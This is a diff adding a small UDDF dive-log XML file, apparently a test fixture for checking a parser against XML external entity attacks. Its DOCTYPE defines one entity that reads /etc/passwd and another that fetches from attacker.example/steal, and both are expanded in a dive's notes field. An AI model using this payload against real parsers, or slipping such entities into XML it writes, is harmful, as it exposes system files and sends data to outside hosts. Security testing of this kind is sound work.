@@ -1,0 +1,19 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE uddf [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+  <!ENTITY remote SYSTEM "https://attacker.example/steal">
+]>
+<uddf xmlns="http://www.streit.cc/uddf/3.2/" version="3.2.1">
+  <profiledata>
+    <repetitiongroup id="rg1">
+      <dive id="d1">
+        <informationbeforedive><datetime>2025-01-01T10:00:00</datetime></informationbeforedive>
+        <informationafterdive>
+          <greatestdepth>10</greatestdepth>
+          <diveduration>1200</diveduration>
+          <notes><para>&xxe;&remote;</para></notes>
+        </informationafterdive>
+      </dive>
+    </repetitiongroup>
+  </profiledata>
+</uddf>
